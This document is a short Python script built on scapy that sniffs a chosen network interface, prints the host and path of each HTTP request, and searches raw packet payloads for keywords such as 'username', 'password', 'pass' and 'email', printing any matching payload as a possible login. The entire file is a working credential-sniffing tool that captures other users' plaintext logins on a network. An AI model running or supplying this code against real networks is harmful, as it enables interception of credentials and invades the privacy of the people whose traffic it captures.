from scapy.all import *
import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify where interface is.")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #utf-8 so we can read it
        print("HTTP Request >> " + (packet[http.HTTPRequest].Host).decode('utf-8') + (packet[http.HTTPRequest].Path).decode('utf-8'))
        #raw data
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = (["username".encode('utf-8'), "password".encode('utf-8'), "pass".encode('utf-8'), "email".encode('utf-8')])
            for key in keys:
                if key in load:
                    print("\nPossible username >> " + load.decode('utf-8') + "\n")

iface = get_interface()
sniff(iface)